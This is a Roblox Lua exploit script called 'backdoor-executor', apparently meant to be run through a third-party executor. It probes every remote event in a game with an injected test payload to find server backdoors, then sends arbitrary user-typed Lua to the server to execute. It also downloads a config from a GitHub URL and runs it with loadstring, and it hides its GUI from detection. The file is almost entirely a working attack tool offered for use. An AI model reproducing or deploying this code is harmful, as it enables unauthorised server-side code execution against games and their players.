-- services
local httpService = game:GetService("HttpService")
local players = game:GetService("Players")
local starterGui = game:GetService("StarterGui")
local textService = game:GetService("TextService")
local tweenService = game:GetService("TweenService")
local uis = game:GetService("UserInputService")
-- objects
local player = players.LocalPlayer
local GUI = game:GetObjects("rbxassetid://7134913833")[1]
local MainUI = GUI.MainUI
local Topbar = MainUI.Topbar
local AttachedText = Topbar.AttachedText
local ExecutorUI = MainUI.ExecutorUI
local TextIDE = ExecutorUI.TextIDE
local SF_Textbox = TextIDE.Textbox
local SF_TextLines = TextIDE.TextLines
local Textbox = SF_Textbox.Textbox
local TextLines = SF_TextLines.TextLines
local ExecBtn = ExecutorUI.ExecuteBtn
local ClearBtn = ExecutorUI.ClearBtn
local R6Btn = ExecutorUI.R6Btn
local RespawnBtn = ExecutorUI.RespawnBtn
local AttachBtn = ExecutorUI.AttachBtn
-- variables
local config = isfile("bexe-config.lua") and readfile("bexe-config.lua") or game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/created-scripts-public/main/backdoor-executor/bexe-config.lua", false)
local eventInfo = {
	["eventInst"] = nil,
	["eventPath"] = "",
	["eventArgs"] = {"source"},
	["eventIter"] = 1,
	["eventFunc"] = nil,
}
local msg_outputs = {
	["attached"] = "\n Attached Event: %s\n Type: %s",
	["printEvent"] = "\n Event: %s\n Type: %s",
	["outdatedCache"] = "This game [%s] cache doesn't work, it might be outdated."
}
local testSource = [[local daValue = Instance.new("StringValue") daValue.Name, daValue.Parent, daValue.Value = game.PlaceId, workspace, "%s"]]
local scannedNameEvents = table.create(0)
local uiDeb, attachDeb = true, true
-- functions
local gotAttached, sendNotif, strToInst
local function createTween(...)
	return tweenService:Create(...)
end

local function checkRemote(inst)
	local instFullName = inst:GetFullName()

	if (config.blacklistSettings.eventNames[inst.Name] or config.blacklistSettings.eventParentNames[inst.Parent.Name]) or
		scannedNameEvents[inst.Name] or
		(inst:FindFirstChild("__FUNCTION") or inst.Name == "__FUNCTION") or
		string.find(instFullName, "MouseInfo") or string.find(instFullName, "HDAdminClient") or
		string.find(instFullName, "Basic Admin Essentials") or
		inst.Parent == game:GetService("RobloxReplicatedStorage") then
		return false
	end
	return true
end

local function execScript(source)
	if eventInfo.eventInst then
		eventInfo.eventArgs[eventInfo.eventIter] = eventInfo.eventFunc and eventInfo.EventFunc(source) or source
		if eventInfo.eventInst:IsA("RemoteEvent") then
			eventInfo.eventInst:FireServer(unpack(eventInfo.eventArgs))
		elseif eventInfo.eventInst:IsA("RemoteFunction") then
			coroutine.wrap(function() eventInfo.eventInst:InvokeServer(unpack(eventInfo.eventArgs)) end)()
		end
	end
end

local function findBackdoors()
	if eventInfo.eventInst then return end
	for _, object in ipairs(game:GetDescendants()) do
		if object:IsA("RemoteEvent") or object:IsA("RemoteFunction") then
			if not checkRemote(object) then continue end
			print(string.format(msg_outputs.printEvent, object:GetFullName(), object.ClassName))
			if object:IsA("RemoteEvent") then
				object:FireServer(string.format(testSource, object:GetFullName()))
			elseif object:IsA("RemoteFunction") then
				pcall(coroutine.wrap(function() object:InvokeServer(string.format(testSource, object:GetFullName())) end))
			end
			local valueLOL = workspace:FindFirstChild(game.PlaceId)
			if valueLOL and valueLOL.Value ~= "" then
				pcall(function()
					gotAttached(strToInst(valueLOL.Value))
				end)
			end
			scannedNameEvents[object.Name] = true
			task.wait()
		end
	end
	table.clear(scannedNameEvents)
end

local function getTextSize(object)
	return textService:GetTextSize(
		object.Text,
		object.TextSize,
		object.Font,
		Vector2.new(object.TextBounds.X, 1e8)
	)
end

function gotAttached(backdooredEvent)
	eventInfo.eventInst, eventInfo.eventPath, eventInfo.eventIter = backdooredEvent, backdooredEvent:GetFullName(), table.find(eventInfo.eventArgs, "source")
	ClearBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	ExecBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	RespawnBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	R6Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
	AttachBtn.TextColor3 = Color3.fromRGB(145, 145, 145)
	AttachedText.Visible = true
	print(string.format(msg_outputs.attached, backdooredEvent:GetFullName(), backdooredEvent.ClassName))
	execScript("game.Workspace:FindFirstChild(game.PlaceId):Destroy()")
	for _, _script in ipairs(config.autoExec) do
		execScript(_script)
	end
	sendNotif("Attached!")
end

local function initDraggify(frame, button)
	local dragToggle = false
	local dragInput, dragStart, startPos
	button.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then
			dragStart, startPos = input.Position, frame.Position
			dragToggle = true
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)
	button.InputChanged:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
			dragInput = input
		end
	end)
	uis.InputChanged:Connect(function(input)
		if input == dragInput and dragToggle then
			local delta = input.Position - dragStart
			local pos = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
			frame.Position = pos
		end
	end)
end

local function initLines()
	local line = 1
	TextLines.Text = ""
	string.gsub(Textbox.Text, "\n", function()
		line = line + 1
	end)
	for lines = 1, line do
		TextLines.Text = TextLines.Text .. lines .. "\n"
	end
end

local function initTextbox()
	initLines()
	Textbox.Text = string.gsub(Textbox.Text, "\t", " ")
	local TextSize = getTextSize(Textbox)
	local TextLineSize = getTextSize(TextLines)
	-- // TextLines
	SF_TextLines.Size = UDim2.new(0, TextLineSize.X + 9, 1, 0)
	SF_TextLines.CanvasSize = UDim2.new(0, 0, 0, TextLineSize.Y + (TextSize.X > TextIDE.AbsoluteSize.X and 2 or 1))
	-- // Textbox
	SF_Textbox.Position = UDim2.new(0, (SF_TextLines.Size.X.Offset + 1), 0, 0)
	SF_Textbox.Size = UDim2.new(1, -(SF_TextLines.Size.X.Offset + 1), 1, 0)
	SF_Textbox.CanvasSize = UDim2.new(0, (TextSize.X > TextIDE.AbsoluteSize.X and TextSize.X + (TextSize.Y > TextIDE.AbsoluteSize.Y and 2 or 1) or 0), 0, TextSize.Y + (TextSize.X > TextIDE.AbsoluteSize.X and 2 or 1))
end

function sendNotif(text)
	return starterGui:SetCore("SendNotification", {
		Title = "backdoor-executor",
		Text = text,
		Duration = 5
	})
end

function strToInst(strPath)
	local pathSplit = string.split(strPath, ".")
	local result = game
	for _, path in ipairs(pathSplit) do
		result = result:FindFirstChild(path) and result[path] or nil
	end
	return result
end

local function syncTextboxScroll()
	SF_TextLines.CanvasPosition = Vector2.new(0, SF_Textbox.CanvasPosition.Y)
end
-- main
AttachBtn.MouseButton1Click:Connect(function()
	if attachDeb and not eventInfo.eventInst then
		sendNotif("Press F9 to see the remotes being scanned.")
		attachDeb = false
		for placeId, cacheData in pairs(config.cachedPlaces) do
			if game.PlaceId == placeId then
				local succ, res = pcall(strToInst, cacheData.Path)
				if succ then
					eventInfo.eventArgs, eventInfo.eventFunc = cacheData.Args, cacheData.Func or nil
					gotAttached(res)
					break
				else
					warn(string.format(msg_outputs.outdatedCache, game.PlaceId))
					break
				end
			end
		end
		findBackdoors()
		if not eventInfo.eventInst then
			sendNotif("No backdoor(s) here!")
			print("No backdoor(s) here!")
			task.wait(.5)
			attachDeb = true
		end
	end
end)
ClearBtn.MouseButton1Click:Connect(function() Textbox.Text = "" end)
ExecBtn.MouseButton1Click:Connect(function() execScript(Textbox.Text) end)
RespawnBtn.MouseButton1Click:Connect(function() execScript(string.format([[game:GetService("Players").%s:LoadCharacter()]], player.Name)) end)
R6Btn.MouseButton1Click:Connect(function() execScript(string.format([[require(4912728750):r6("%s")]], player.Name)) end)
Textbox:GetPropertyChangedSignal("Text"):Connect(initTextbox)
SF_Textbox:GetPropertyChangedSignal("CanvasPosition"):Connect(syncTextboxScroll)
uis.InputBegan:Connect(function(input)
	local tween, connection
	local tweenInfo = TweenInfo.new(.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
	if input.KeyCode == Enum.KeyCode.RightControl and uis:GetFocusedTextBox() == nil then
		if uiDeb then
			uiDeb = false
			if not MainUI.Visible then
				MainUI.Visible = true
				tween = createTween(MainUI, tweenInfo, {
					Size = UDim2.new(0, 500, 0, 300)
				})
				tween:Play()
				connection = tween.Completed:Connect(function()
					Topbar.Visible = true
					ExecutorUI.Visible = true
					uiDeb = false
				end)
			elseif MainUI.Visible then
				tween = createTween(MainUI, tweenInfo, {
					Size = UDim2.new(0, 0, 0, 0)
				})
				MainUI.Position = UDim2.new(.5, 0, .5, 0)
				Topbar.Visible = false
				ExecutorUI.Visible = false
				task.wait()
				tween:Play()
				connection = tween.Completed:Connect(function()
					MainUI.Visible = false
					uiDeb = false
				end)
			end
			task.wait(.75)
			uiDeb = true
			connection:Disconnect()
			tween:Destroy()
		end
	end
end)

do -- INITIALIZER
	local tween, connection
	local gethui = gethui or gethiddenui or get_hidden_gui or function()
		return game:GetService("CoreGui")
	end
	if syn and syn.protect_gui then syn.protect_gui(GUI) end
	GUI.Parent = gethui()
	MainUI.Visible = true
	tween = createTween(MainUI, TweenInfo.new(.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
		Size = UDim2.new(0, 500, 0, 300)
	})
	connection = tween.Completed:Connect(function()
		Topbar.Visible = true
		ExecutorUI.Visible = true
		connection:Disconnect()
		tween:Destroy()
	end)
	initDraggify(MainUI, Topbar);initTextbox()
	tween:Play()
	if not isfile("bexe-config.lua") then writefile("bexe-config.lua", config) end
	pcall(function()
		config = loadstring(config)()
	end)
	if typeof(config) == "string" or (config.configVer and config.configVer < 3) then
		config = game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/created-scripts-public/main/backdoor-executor/bexe-config.lua", false)
		writefile("bexe-config.lua", config)
		config = loadstring(config)()
	end
end
